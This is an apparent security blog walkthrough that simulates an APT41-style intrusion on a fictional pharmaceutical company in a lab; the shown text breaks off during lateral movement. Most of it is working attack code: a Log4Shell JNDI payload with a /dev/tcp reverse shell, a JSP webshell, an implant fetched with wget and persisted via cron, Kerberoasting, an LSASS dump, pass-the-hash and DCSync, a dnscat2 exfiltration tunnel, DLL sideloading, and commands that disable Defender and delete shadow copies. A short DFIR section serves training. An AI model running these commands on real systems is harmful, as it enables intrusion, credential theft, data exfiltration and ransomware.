# Operation DragonRx: Simulating an APT41 Attack End-to-End — From Log4Shell to DFIR and Malware Analysis

*A practitioner walkthrough: deploy the lab, run the attack, catch it, investigate it, analyze the malware.*

> **Scope notice:** NovaTech Pharma, Operation DragonRx, the RxPhage implant, all IP addresses, credentials, campaign IDs, User-Agent strings, and IOCs in this article are entirely fictional and used for simulation purposes only. They describe a controlled lab exercise, not a real incident. Commands are provided for authorized research environments.

---

## Table of Contents

1. [Introduction: The Group That Plays Both Sides](#introduction-the-group-that-plays-both-sides)
2. [Lab Architecture](#lab-architecture)
3. [Lab Walkthrough — Practical Execution](#lab-walkthrough--practical-execution)
4. [Phase 0: Reconnaissance](#phase-0-reconnaissance)
5. [Phase 1: Initial Access — Log4Shell (CVE-2021-44228)](#phase-1-initial-access--log4shell-cve-2021-44228)
6. [Phase 2: Foothold — Two-Layer Persistence](#phase-2-foothold--two-layer-persistence)
7. [Phase 3: Discovery — Mapping the Internal Network](#phase-3-discovery--mapping-the-internal-network)
8. [Phase 4: Credential Access — Four Techniques in Sequence](#phase-4-credential-access--four-techniques-in-sequence)
9. [Phase 5: Lateral Movement — Linux to Domain Admin](#phase-5-lateral-movement--linux-to-domain-admin)
10. [Phase 6: Collection — Staging the Crown Jewels](#phase-6-collection--staging-the-crown-jewels)
11. [Phase 7: Exfiltration — Two Channels](#phase-7-exfiltration--two-channels)
12. [Phase 8: Persistence — DLL Sideloading on the Domain Controller](#phase-8-persistence--dll-sideloading-on-the-domain-controller)
13. [Phase 9 (Optional): The Criminal Turn — Ransomware](#phase-9-optional-the-criminal-turn--ransomware)
14. [Phase 10: Detection — What the SOC Finally Sees](#phase-10-detection--what-the-soc-finally-sees)
15. [DFIR — Full Investigation](#dfir--full-investigation)
16. [Malware Analysis: RxPhage (Simulated)](#malware-analysis-rxphage-simulated)
17. [Scope, Impact, and Eradication](#scope-impact-and-eradication)
18. [Defensive Posture — What Would Have Stopped This](#defensive-posture--what-would-have-stopped-this)
19. [Full ATT&CK Coverage — Operation DragonRx (Simulated)](#full-attck-coverage--operation-dragonrx-simulated)
20. [Conclusions](#conclusions)
21. [References](#references)

---

## Introduction: The Group That Plays Both Sides

Most nation-state threat actors operate under a clear mandate — steal secrets or disrupt infrastructure. APT41 is assessed to operate differently. Mandiant's 2019 analysis [[2]](#ref-2) characterized the group as conducting both MSS-directed espionage and, separately, financially motivated criminal operations — an unusual duality that Mandiant described using deliberate probabilistic language: criminal activity "potentially outside of state control" and "what appears to be personal financial gain." The 2020 US Department of Justice indictment [[1]](#ref-1) of five individuals — including Zhang Haoran and Tan Dailin, operating through the Chengdu 404 Network Technology contractor front — formalized that assessment into criminal charges spanning both espionage-adjacent intrusions and financially motivated schemes.

This dual mandate makes APT41 (MITRE ATT&CK G0096 [[5]](#ref-5), also tracked as Winnti Group, Double Dragon, BARIUM, Bronze Atlas, and Wicked Panda) operationally distinctive. A victim organization may be penetrated for IP theft under state tasking and have ransomware deployed — potentially by a different team, or the same operators acting outside their mandate — on the same infrastructure days later. During the COVID-19 pandemic, Chinese government-linked actors were reported to have targeted organizations involved in vaccine research, including, according to media reporting, Moderna. APT41 (G0096) has a separately documented track record of targeting the pharmaceutical and healthcare sector across multiple campaigns; attributing any specific COVID-19 research intrusion to APT41 requires a primary intelligence source rather than aggregated media reporting. In early 2022, Mandiant documented APT41 exploiting CVE-2021-44228 (Log4Shell) within hours of public disclosure against US state government networks [[3]](#ref-3) — consistent with the group's documented pattern of rapid weaponization.

This article simulates an APT41-style campaign from start to finish — reconnaissance through exfiltration, with a ransomware option — in a fully reproducible lab environment. We then switch perspectives to the defensive side: what the SOC catches and when, how to conduct the full DFIR investigation, and how to reverse-engineer the custom implant we deploy.

**Target:** NovaTech Pharma Inc. (fictional) — a mid-size pharmaceutical company with a patient portal running a vulnerable Java application. Phase III clinical trial data worth stealing. Cyber insurance policy worth ransoming.

**Campaign codename:** Operation DragonRx (fictional simulation).

> **Companion CTI Report:** A full adversary-emulation intelligence report for this campaign — covering the Diamond Model, complete ATT&CK TTP matrix (38 techniques across 11 tactic categories), per-technique APT41 attribution confidence, IOCs, detection rules, alternative attribution hypotheses, and defensive recommendations — is published separately as [`apt41-dragonrx-cti-report.md`](apt41-dragonrx-cti-report.md) (TLP:WHITE). Key findings: dwell time 4 days 17 hours; all 12 SIEM alerts fired correctly; none reviewed until Day 6 — triage failure, not tooling failure. TTP fidelity is HIGH for Log4Shell exploitation speed, China Chopper webshell, and DLL sideloading pattern; LOW for Sliver and dnscat2 (generic tools, not APT41-specific).

---

## Lab Architecture

The lab is hybrid: Docker Compose handles the attacker infrastructure and vulnerable web target; VirtualBox provides the Windows Active Directory environment. You need approximately 32 GB RAM and 200 GB SSD.

**Network layout:**

```
ATTACKER NETWORK (10.0.0.0/24)  [simulated]
  10.0.0.5    Kali Linux         — attacker machine
  10.0.0.10   Sliver C2          — command and control
  10.0.0.20   JNDI exploit server — Log4Shell delivery

TARGET NETWORK (192.168.10.0/24)  [simulated]
  192.168.10.100  WEB01  Spring Boot app, log4j-core 2.14.1    ← entry point
  192.168.10.10   DC01   Windows Server 2019 Domain Controller
  192.168.10.20   FS01   Windows Server 2019 File Server (crown jewels)
  192.168.10.50   WS01   Windows 10 22H2 workstation (researcher)
  192.168.10.200  Wazuh + Elastic SIEM
  (Zeek — host network mode, no fixed IP, monitors all interfaces)
```

The `docker-compose.yml` defines all Docker services (Kali, Sliver, JNDI server, vulnerable web app, Wazuh, Elastic, Kibana, Zeek). The three Windows VMs are on a VirtualBox host-only network (`vboxnet0`) that bridges into the same `192.168.10.0/24` subnet as the Docker `target_net`. From the attacker's perspective, everything lives on one flat network — just as it does in most real environments.

**Detection stack on from the start:** Sysmon runs on all Windows hosts (custom config catching process creation, network connections, DLL loads, LSASS access, and scheduled task creation). Zeek passively monitors all traffic. Wazuh agents ship logs to Elastic. This lets us observe the blue-team perspective in real time alongside each attack phase.

**Deploy the lab:**

> Requirements: Docker ≥ 24, Vagrant ≥ 2.3, VirtualBox ≥ 7.0, Ansible ≥ 9, ~32 GB RAM, ~200 GB SSD.

```bash
# Clone the lab
git clone https://github.com/anpa1200/dragonrx-lab
cd dragonrx-lab

# Option A — one script (Docker + Windows VMs + Ansible + validation)
bash scripts/deploy.sh

# Option B — Docker containers only (no Windows VMs needed)
docker compose up -d
until docker exec dragonrx_wazuh pgrep wazuh-analysisd >/dev/null 2>&1; do sleep 5; done
docker cp siem/wazuh/rules/dragonrx_rules.xml dragonrx_wazuh:/var/ossec/etc/rules/
docker exec dragonrx_wazuh /var/ossec/bin/wazuh-control restart

# Access points once up:
#   Kibana SIEM  →  http://localhost:5601
#   Kali shell   →  docker exec -it dragonrx_kali /bin/bash
#   Sliver C2    →  docker exec -it dragonrx_c2 sliver
#   Log4Shell    →  http://10.0.0.100:8080/  (header: X-Api-Version)
```

---

## Lab Walkthrough — Practical Execution

Each phase below maps to a specific machine. Keep track of which shell you're in — it changes as the attack progresses.

```
[Kali attacker] ──► [WEB01 reverse shell] ──► [WS01 PsExec] ──► [DC01 PsExec]
```

### Connect to the attacker machine

```bash
# Option A — SSH (Kali container exposes port 2222)
ssh kali@localhost -p 2222
# default password: kali

# Option B — docker exec
docker exec -it dragonrx_kali /bin/bash
```

All Phase 0–1 and Impacket commands run **from Kali**. Phase 2–8 commands run on the host shown at the start of each block.

---

### Phase 0 — Recon (from Kali)

```bash
# Passive: certificate transparency
curl -s "https://crt.sh/?q=%25.novatech-pharma.com&output=json" | \
  python3 -c "import sys,json; [print(r['name_value']) for r in json.load(sys.stdin)]" | sort -u

# Active: fingerprint the target
nmap -sV -sC -p 8080 192.168.10.100 -oA /opt/recon/web01_scan
curl -s "http://192.168.10.100:8080/DOESNOTEXIST" | grep -i "log4j"
# log4j-core-2.14.1.jar  ← confirmed
```

---

### Phase 1 — Initial Access (from Kali)

```bash
# Terminal 1 — listener
rlwrap nc -lvnp 4444

# Terminal 2 — verify callback first (no code execution)
curl -s http://192.168.10.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/test}'
# JNDI server log shows incoming connection → vulnerable, proceed

# Terminal 2 — compile and stage payload
mkdir -p /opt/tools/exploit
cat > /opt/tools/exploit/Exploit.java << 'EOF'
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash","-c","bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) { e.printStackTrace(); }
    }
}
EOF
javac -source 8 -target 8 /opt/tools/exploit/Exploit.java
python3 -m http.server 8888 --directory /opt/tools/exploit/ &

# Terminal 2 — fire
curl -s http://192.168.10.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/Exploit}'
# Terminal 1 receives: www-data@web01:~$
```

---

### Phase 2 — Foothold (from WEB01 reverse shell)

```bash
# --- now inside the reverse shell on WEB01 ---

# Upgrade to PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# [Ctrl+Z]  →  stty raw -echo; fg  →  export TERM=xterm

# Drop webshell
mkdir -p /opt/tomcat/webapps/ROOT/resources/imgs
cat > /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp << 'EOF'
<%@page import="java.util.*,java.io.*"%><%
String cmd = request.getParameter("c");
if(cmd != null && !cmd.isEmpty()) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder(); String line;
    while((line = br.readLine()) != null) sb.append(line).append("\n");
    out.print(sb.toString());
}
%>
EOF

# Verify webshell
curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp?c=id"
# uid=33(www-data)

# Deploy RxPhage beacon (from a second Kali terminal, serve the binary)
# [Kali]  python3 -m http.server 8900 --directory /opt/tools/rxphage/ &

mkdir -p /tmp/.cache
curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=wget http://10.0.0.5:8900/rxphage -O /tmp/.cache/rxphage && chmod +x /tmp/.cache/rxphage"

# Persist via cron and start
curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=(crontab -l 2>/dev/null; echo '@reboot /tmp/.cache/rxphage') | crontab -"
curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=nohup /tmp/.cache/rxphage &>/dev/null & echo \$!"

# Confirm beacon in Sliver
# [Kali]  docker exec -it dragonrx_c2 sliver
# sliver > sessions
```

---

### Phase 3 — Discovery (from WEB01 reverse shell)

```bash
# --- still on WEB01 as www-data ---

# Live host sweep
for i in $(seq 1 254); do
  (ping -c 1 -W 1 192.168.10.$i &>/dev/null && echo "UP: 192.168.10.$i") &
done; wait

# Port scan
nmap -sV -p 135,139,389,445,3389,5985 192.168.10.10 192.168.10.20 192.168.10.50

# Pull credentials from Tomcat config
cat /opt/tomcat/conf/context.xml | grep -A5 "connectionPassword"
# svc_ldap / NovaTech2021!
```

---

### Phase 3 (cont.) — AD Enumeration (from Kali, using stolen creds)

```bash
# --- back on Kali ---

# Enumerate domain users
ldapsearch -x -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" "(objectClass=user)" sAMAccountName department

# Find Kerberoastable accounts (SPNs)
ldapsearch -x -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName
# svc_backup: MSSQLSvc/FS01.novatech.local:1433  ← target
```

---

### Phase 4 — Credential Access (from Kali)

```bash
# Kerberoast svc_backup
impacket-GetUserSPNs novatech.local/svc_ldap:'NovaTech2021!' \
  -dc-ip 192.168.10.10 -request -outputfile /opt/loot/kerberoast_hashes.txt

hashcat -m 13100 /opt/loot/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule -o /opt/loot/cracked.txt
cat /opt/loot/cracked.txt
# svc_backup:Backup_Svc99!

# Move to WS01 with jsmith creds
impacket-psexec novatech.local/jsmith:'Research#2024'@192.168.10.50 cmd.exe
```

**LSASS dump (from WS01 PsExec shell):**

```cmd
rem --- now on WS01 as jsmith ---
for /f "tokens=2" %i in ('tasklist /fi "imagename eq lsass.exe" /fo list ^| find "PID"') do set LSASSPID=%i
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump %LSASSPID% C:\Temp\lsass.dmp full
```

**Parse dump (back on Kali):**

```bash
# Copy dump back
impacket-smbclient novatech.local/jsmith:'Research#2024'@192.168.10.50 \
  -c "get C:\Temp\lsass.dmp /opt/loot/lsass.dmp"

pypykatz lsa minidump /opt/loot/lsass.dmp 2>/dev/null | grep -A3 "Username"
# jsmith     NTLM: YYYY...  Password: Research#2024
# Administrator  NTLM: XXXX...   ← use this for PtH
```

---

### Phase 5 — Lateral Movement to DC01 (from Kali)

```bash
# Pass-the-Hash sweep
crackmapexec smb 192.168.10.0/24 \
  -u administrator -H "aad3b435b51404eeaad3b435b51404ee:XXXX..." \
  --local-auth -x "whoami"

# Shell on DC01
impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:XXXX..." \
  novatech.local/administrator@192.168.10.10 cmd.exe
# C:\Windows\system32> whoami
# nt authority\system
```

**DCSync (from Kali, using DA creds):**

```bash
impacket-secretsdump novatech.local/Administrator:'NovaTech_Admin2024!'@192.168.10.10 \
  -just-dc-ntlm -output /opt/loot/dcsync_hashes
cat /opt/loot/dcsync_hashes.ntds
# krbtgt:502:...:KKKK...:::   ← full domain compromise
```

---

### Phase 6 — Collection (from DC01 PsExec shell)

```cmd
rem --- on DC01 as SYSTEM ---
net use Z: \\192.168.10.20\Research /user:NOVATECH\Administrator NovaTech_Admin2024!
net use Y: \\192.168.10.20\Manufacturing /user:NOVATECH\Administrator NovaTech_Admin2024!

mkdir C:\Temp\archive
robocopy Z:\ C:\Temp\archive\Research /E /NFL /NDL
robocopy Y:\ C:\Temp\archive\Manufacturing /E /NFL /NDL
robocopy \\192.168.10.10\SYSVOL C:\Temp\archive\SYSVOL /E /NFL /NDL

certutil.exe -urlcache -f http://10.0.0.5:8900/7za.exe C:\Temp\7za.exe
C:\Temp\7za.exe a -tzip -p"RxPhage2024!" -mx9 C:\Temp\data.zip C:\Temp\archive\
```

---

### Phase 7 — Exfiltration (from Sliver console on Kali)

```bash
# Sliver C2
docker exec -it dragonrx_c2 sliver

# sliver > sessions
# sliver > use <DC01 session ID>
# sliver (dc01) > download C:\Temp\data.zip /opt/loot/dc01_data.zip
```

**DNS tunnel fallback (from Kali + WEB01):**

```bash
# [Kali] start dnscat2 server
ruby /opt/tools/dnscat2/server/dnscat2.rb \
  --dns "host=10.0.0.5,port=53,domain=tunnel.attacker-infra.com" \
  --no-cache --secret="DragonRx2024"

# [WEB01 webshell] connect client
curl -s "http://192.168.10.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=nohup /tmp/.cache/dnscat --secret='DragonRx2024' tunnel.attacker-infra.com &>/dev/null &"
```

---

### Phase 8 — Persistence via DLL Sideloading (from DC01 PsExec shell)

```cmd
rem --- on DC01 as SYSTEM ---
mkdir "C:\ProgramData\Oracle\Java\javapath"
copy "C:\Program Files\Java\jre8\bin\java.exe" ^
     "C:\ProgramData\Oracle\Java\javapath\java.exe"
```

```bash
# [Kali / Sliver] upload malicious DLL
# sliver (dc01) > upload /opt/tools/rxphage/rxphage_loader.dll ^
#                        "C:\ProgramData\Oracle\Java\javapath\jvm.dll"
```

```cmd
rem --- back on DC01 ---
schtasks /create /tn "JavaUpdateService" ^
  /tr "C:\ProgramData\Oracle\Java\javapath\java.exe" ^
  /sc ONSTART /ru SYSTEM /f

powershell -command ^
  "(Get-Item 'C:\ProgramData\Oracle\Java\javapath\jvm.dll').LastWriteTime = '2023-01-15 09:00:00'"
```

---

### Phase 9 — Ransomware (optional, from DC01 PsExec shell)

```cmd
rem --- on DC01 as SYSTEM ---
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"
vssadmin delete shadows /all /quiet
net stop "wbengine" /y
net stop "SDRSVC" /y

rem Safe test path only — encryptor targets C:\Temp\RansomTest\
mkdir C:\Temp\RansomTest
echo "Phase III Trial Data" > C:\Temp\RansomTest\trial_summary.txt
```

```bash
# [Kali / Sliver]
# sliver (dc01) > upload /opt/tools/encryptor/rxphage_encrypt.exe C:\Temp\rxphage_encrypt.exe
# sliver (dc01) > execute C:\Temp\rxphage_encrypt.exe -- --target C:\Temp\RansomTest
```

---

### DFIR — Verify Detections (from analyst workstation)

```bash
# Is C2 still active?
docker exec dragonrx_zeek grep "10.0.0.10" /usr/local/zeek/logs/current/conn.log | tail -5

# When did compromise start?
docker exec dragonrx_zeek grep "jndi:" /usr/local/zeek/logs/current/http.log | head -1

# Open Kibana — review all 12 alerts
open http://localhost:5601
# Index: wazuh-alerts-*
# Filter: rule.level >= 10
# Time range: last 7 days

# Run DNS entropy check against live Zeek logs
docker exec dragonrx_zeek python3 - << 'EOF'
import math, os

def entropy(s):
    freq = {}
    for c in s: freq[c] = freq.get(c, 0) + 1
    return -sum(p/len(s)*math.log2(p/len(s)) for p in freq.values())

log = "/usr/local/zeek/logs/current/dns.log"
if not os.path.exists(log):
    print("dns.log not found — no DNS traffic captured yet")
else:
    with open(log) as f:
        for line in f:
            if line.startswith('#'): continue
            fields = line.strip().split('\t')
            if len(fields) < 10: continue
            query = fields[9]
            sub = query.split('.')[0]
            if len(sub) > 15 and entropy(sub) > 3.5:
                print(f"[DNS TUNNEL] {query}  entropy={entropy(sub):.2f}")
EOF
```

---

## Phase 0: Reconnaissance

**ATT&CK: T1595.002, T1592.002, T1589.002**

APT41 is documented to conduct reconnaissance before initial access, mapping the external surface using open sources before direct interaction with target infrastructure. We replicate this with passive and low-noise active techniques.

**Passive reconnaissance:**

```bash
# Certificate Transparency — enumerate subdomains without touching NovaTech's servers
curl -s "https://crt.sh/?q=%25.novatech-pharma.com&output=json" | \
  python3 -c "import sys,json; [print(r['name_value']) for r in json.load(sys.stdin)]" | \
  sort -u

# Results (simulated):
# patient-portal.novatech-pharma.com
# webmail.novatech-pharma.com
# vpn.novatech-pharma.com

# Shodan: check what's internet-exposed
shodan search 'org:"NovaTech Pharma"' --fields ip_str,port,product

# Employee harvesting
theHarvester -d novatech-pharma.com -b google,linkedin,bing -l 200
```

**Active fingerprinting — quiet but targeted:**

```bash
nmap -sV -sC -p 80,443,8080 10.0.0.100 -oA recon/web01_scan

whatweb http://10.0.0.100:8080 --log-verbose recon/whatweb.txt

# HTTP header analysis reveals the technology stack
curl -s -o /dev/null -D - http://10.0.0.100:8080/ | \
  grep -iE "server|x-powered"
# Server: Apache-Coyote/1.1  ← Tomcat

# Misconfigured application error page exposes classpath
curl -s "http://10.0.0.100:8080/DOESNOTEXIST" | grep -i "log4j"
# log4j-core-2.14.1.jar  ← confirmed Log4Shell vector
```

The error page returns Java stack trace information exposing `log4j-core-2.14.1` in the classpath. This reflects a misconfigured application error handling configuration or a development-mode error page — not Tomcat's default behavior — but it is a common misconfiguration in Java application deployments. The reconnaissance phase generates essentially no alerts: certificate transparency lookups are read-only external requests, Shodan queries its own index (never NovaTech's servers directly), and a handful of HTTP requests to the login page are indistinguishable from normal web traffic.

---

## Phase 1: Initial Access — Log4Shell (CVE-2021-44228)

**ATT&CK: T1190**

Log4Shell is the vulnerability that defined 2021. [[4]](#ref-4)[[9]](#ref-9) Versions of Apache Log4j prior to 2.17.0 perform JNDI (Java Naming and Directory Interface) lookups when they encounter specially crafted strings in logged data. If an attacker can inject the string `${jndi:ldap://attacker.com/payload}` into any field that Log4j logs — a header, a username, a query parameter — a vulnerable JVM initiates an outbound JNDI lookup.

**Important JDK caveat:** The classic exploit chain — where the victim JVM fetches and executes a remote Java class from an attacker-controlled server via LDAP — depends on the target JDK version. Java 8u191+, Java 11+, and later versions disable LDAP-based remote codebase loading (`com.sun.jndi.ldap.object.trustURLCodebase`) by default. In those configurations, the marshalsec-style chain does not execute remote code directly; attackers must pivot to alternative delivery — deserialization gadgets, local classpath manipulation, or other JNDI-exploitable protocols. **This lab targets a Java 8 pre-u191 JVM specifically**, where the classic chain works as described. Verify your target's JDK version before assuming this chain will execute in other environments.

NovaTech's patient portal logs the `X-Api-Version` HTTP header at login. That is the trigger point.

**Step 1: Verify the callback (confirm vulnerability before execution)**

```bash
# Start callback listener
nc -lvnp 9999 &

curl -s http://10.0.0.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/test}'

# JNDI server log shows: "Incoming LDAP connection from 192.168.10.100"
# Vulnerability confirmed without executing a payload
```

**Step 2: Prepare reverse shell payload**

The exploit server (marshalsec) acts as the LDAP relay: it redirects the victim JVM's JNDI lookup to an attacker HTTP server hosting the malicious class.

```bash
# Exploit.java — executed by the victim JVM (Java 8 pre-u191 target)
public class Exploit {
    static {
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"};
            Runtime.getRuntime().exec(cmd);
        } catch (Exception e) { e.printStackTrace(); }
    }
}

# Compile targeting Java 8 compatibility
javac -source 8 -target 8 Exploit.java
```

**Step 3: Fire**

```bash
# Terminal 1: Listener
rlwrap nc -lvnp 4444

# Terminal 2: JNDI server already running in Docker (marshalsec)
# Terminal 3: Trigger
curl -s http://10.0.0.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/Exploit}'

# Terminal 1 receives:
# Connection from 192.168.10.100:49812
# bash: no job control in this shell
# www-data@web01:/opt/tomcat$
```

The shell lands running as `www-data` — the Tomcat service account.

**Artifact left in the app's access log:**
```
10.0.0.5 - - [20/Apr/2026:14:23:07] "GET / HTTP/1.1" 200 -
  X-Api-Version: ${jndi:ldap://10.0.0.20:1389/Exploit}
```

The raw JNDI string is written verbatim to the access log via Log4j. This is the highest-fidelity forensic artifact of initial access.

---

## Phase 2: Foothold — Two-Layer Persistence

**ATT&CK: T1505.003, T1053.003**

Reported APT41 post-access behavior consistently involves deploying multiple independent persistence mechanisms before further activity. Webshells provide fast, interactive access but are relatively detectable via file integrity monitoring and access log analysis. Custom implants are stealthier and durable. The group is reported to run both in parallel.

**Layer 1: JSP Webshell (China Chopper pattern — simulated)**

```bash
# Stabilize the reverse shell to a proper PTY first
python3 -c 'import pty; pty.spawn("/bin/bash")'
# [Ctrl+Z, then:] stty raw -echo; fg
export TERM=xterm

# Place webshell in a plausible-looking path inside the webroot
mkdir -p /opt/tomcat/webapps/ROOT/resources/imgs
cat > /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp << 'EOF'
<%@page import="java.util.*,java.io.*"%><%
String cmd = request.getParameter("c");
if(cmd != null && !cmd.isEmpty()) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder(); String line;
    while((line = br.readLine()) != null) sb.append(line).append("\n");
    out.print(sb.toString());
}
%>
EOF

# Test
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp?c=id"
# uid=33(www-data) gid=33(www-data)
```

**Layer 2: RxPhage implant — custom Go beacon (fictional, simulated)**

RxPhage is the custom PlugX-lite RAT built for this simulation. It connects to the Sliver C2 server over HTTPS using a User-Agent string that mimics Oracle Java Update traffic. All RxPhage characteristics — the binary, User-Agent, beacon paths, campaign ID, chunk sizes, XOR key, and C2 infrastructure — are fictional and created for this lab exercise.

```bash
# Host the pre-compiled binary from Kali
python3 -m http.server 8900 --directory /opt/tools/rxphage/ &

# Deploy via webshell
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=wget http://10.0.0.5:8900/rxphage -O /tmp/.cache/rxphage && chmod +x /tmp/.cache/rxphage"

# Persist via cron (survives reboots)
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=(crontab -l 2>/dev/null; echo '@reboot /tmp/.cache/rxphage') | crontab -"

# Launch
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp" \
  --data-urlencode "c=nohup /tmp/.cache/rxphage &>/dev/null & echo \$!"
```

Sliver confirms the beacon (simulated output):

```
sliver > sessions
ID  Name         Transport  RemoteAddress          Username  OS/Arch  Beacon
--  -----------  ---------  ---------------------  --------  -------  ------
1   WEB01_BEAM   https      192.168.10.100:54231   www-data  linux    60s
```

Two independent access paths to WEB01. The webshell provides fast, interactive access. RxPhage provides durable, encrypted persistence.

---

## Phase 3: Discovery — Mapping the Internal Network

**ATT&CK: T1046, T1082, T1087.002, T1018, T1552.001**

From inside WEB01, the internal `192.168.10.0/24` network is reachable. First task: map live hosts and services.

```bash
# Live host sweep
for i in $(seq 1 254); do
  (ping -c 1 -W 1 192.168.10.$i &>/dev/null && echo "192.168.10.$i") &
done; wait

# Port scan discovered hosts
nmap -sV -p 22,80,135,139,389,443,445,636,3389,5985 \
  192.168.10.10 192.168.10.20 192.168.10.50 2>/dev/null
```

Results (simulated):
- `192.168.10.10:389,445,3389` — LDAP, SMB, RDP → Domain Controller
- `192.168.10.20:445` — SMB only → file server
- `192.168.10.50:445,3389` — SMB + RDP → workstation

**The credential find that changes everything:**

Tomcat application configuration files often contain hardcoded database or directory service credentials — an extremely common misconfiguration in enterprise Java deployments:

```bash
find /opt/tomcat -name "*.xml" 2>/dev/null | xargs grep -il "password"
cat /opt/tomcat/conf/context.xml
```

```xml
<Resource name="ldap/NovaTech"
  type="javax.naming.directory.DirContext"
  connectionURL="ldap://192.168.10.10:389"
  connectionName="cn=svc_ldap,dc=novatech,dc=local"
  connectionPassword="NovaTech2021!"
  ... />
```

`svc_ldap` / `NovaTech2021!` — a valid Active Directory service account in plaintext. This immediately opens the entire AD directory to enumeration from the Linux web server.

**AD enumeration using stolen credentials from Linux:**

```bash
# Enumerate all domain users
ldapsearch -x -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" \
  "(objectClass=user)" sAMAccountName department

# Find accounts with SPNs (Kerberoastable)
ldapsearch -x -H ldap://192.168.10.10 \
  -D "cn=svc_ldap,dc=novatech,dc=local" -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# Simulated output:
# svc_backup: MSSQLSvc/FS01.novatech.local:1433  ← Kerberoastable target
```

---

## Phase 4: Credential Access — Four Techniques in Sequence

**ATT&CK: T1552.001, T1558.003, T1003.001, T1003.006**

### Kerberoasting

`svc_backup` has a Service Principal Name registered. Using stolen `svc_ldap` credentials, we request a Kerberos service ticket (TGS) for that SPN. The ticket is encrypted with `svc_backup`'s NTLM hash and can be cracked offline.

```bash
impacket-GetUserSPNs novatech.local/svc_ldap:'NovaTech2021!' \
  -dc-ip 192.168.10.10 -request \
  -outputfile /opt/loot/kerberoast_hashes.txt

# $krb5tgs$23$*svc_backup$NOVATECH.LOCAL$MSSQLSvc/FS01.novatech.local:1433*$...

hashcat -m 13100 /opt/loot/kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  --rules-file /usr/share/hashcat/rules/best64.rule \
  -o /opt/loot/cracked.txt

# Simulated result: svc_backup:Backup_Svc99!
```

The RC4 (encryption type `0x17`) used for the TGS is the key forensic signal — it appears in Windows Event ID 4769. Modern AD environments default to AES256 (`0x12`); an RC4 TGS request is a Kerberoasting indicator when contextualized against the requesting account, host, and environment (see Detection section for required caveats).

### LSASS Dump — Living Off the Land

Once on WS01 (covered in Phase 5), we dump LSASS using a signed Microsoft DLL — `comsvcs.dll` — with no additional tooling:

```powershell
# On WS01, as local admin
$pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $pid C:\Temp\lsass.dmp full
```

`comsvcs.dll` `MiniDump` is a legitimate Windows function invoked via a signed Microsoft binary — a LOLBAS (Living Off the Land Binaries and Scripts) technique using the operating system against itself. Parsing the dump offline:

```bash
pypykatz lsa minidump /opt/loot/lsass.dmp 2>/dev/null | grep -A3 "Username"
# Simulated output:
# Username: jsmith  NTLM: YYYY...  Password: Research#2024
# Username: Administrator  NTLM: XXXX...
```

### DCSync

With Domain Admin credentials, we issue replication requests directly to the Domain Controller — impersonating the synchronization process a legitimate DC uses:

```bash
impacket-secretsdump novatech.local/Administrator:'NovaTech_Admin2024!'@192.168.10.10 \
  -just-dc-ntlm -output /opt/loot/dcsync_hashes

# dcsync_hashes.ntds (simulated):
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:XXXXXXXXXXXXXXXXXXXXXXXX:::
# jsmith:1103:aad3b435b51404eeaad3b435b51404ee:YYYYYYYYYYYYYYYYYYYYYYYY:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:KKKKKKKKKKKKKKKKKKKKKKKK:::
```

Every account's NTLM hash — including `krbtgt`. With the `krbtgt` hash, an attacker can forge Golden Tickets: Kerberos tickets granting access to any domain service, persistent even after regular account password resets. This is why domain rebuilds are sometimes the only safe post-DCSync recovery path.

---

## Phase 5: Lateral Movement — Linux to Domain Admin

**ATT&CK: T1550.002, T1021.002, T1047**

The pivot chain runs from WEB01 (Linux, `www-data`) to DC01 (Windows, SYSTEM):

```
WEB01 (Linux, www-data)
  ──[svc_ldap plaintext creds]──► WS01 (Windows, jsmith)
